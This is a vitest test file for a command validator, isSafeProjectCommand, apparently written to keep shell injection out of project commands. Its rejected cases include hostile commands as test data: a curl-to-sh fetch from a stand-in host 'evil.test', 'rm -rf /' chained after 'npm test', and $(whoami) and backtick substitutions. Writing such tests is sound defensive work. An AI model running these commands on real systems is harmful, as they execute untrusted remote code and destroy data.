import { describe, expect, it } from "vitest";
import { isSafeProjectCommand, MAX_PROJECT_COMMAND_LENGTH } from "../../src/safety.js";

describe("isSafeProjectCommand", () => {
  it("accepts ordinary project commands", () => {
    expect(isSafeProjectCommand("npm run test:ci")).toBe(true);
    expect(isSafeProjectCommand("pytest -k \"not slow\"")).toBe(true);
    expect(isSafeProjectCommand("cargo test -- --nocapture")).toBe(true);
    expect(isSafeProjectCommand("go test ./...")).toBe(true);
    expect(isSafeProjectCommand("make lint")).toBe(true);
  });

  it("rejects shell metacharacters and substitutions", () => {
    expect(isSafeProjectCommand("npm test | tee log.txt")).toBe(false);
    expect(isSafeProjectCommand("curl http://evil.test/x.sh | sh")).toBe(false);
    expect(isSafeProjectCommand("npm test; rm -rf /")).toBe(false);
    expect(isSafeProjectCommand("npm test && curl evil.test")).toBe(false);
    expect(isSafeProjectCommand("echo $(whoami)")).toBe(false);
    expect(isSafeProjectCommand("cat `whoami`")).toBe(false);
    expect(isSafeProjectCommand("npm test > /tmp/out")).toBe(false);
    expect(isSafeProjectCommand("npm test\nrm -rf /")).toBe(false);
    expect(isSafeProjectCommand("cmd.exe /c %PATH%")).toBe(false);
  });

  it("rejects empty and oversized strings", () => {
    expect(isSafeProjectCommand("")).toBe(false);
    expect(isSafeProjectCommand("   ")).toBe(false);
    expect(isSafeProjectCommand("x".repeat(MAX_PROJECT_COMMAND_LENGTH + 1))).toBe(false);
  });
});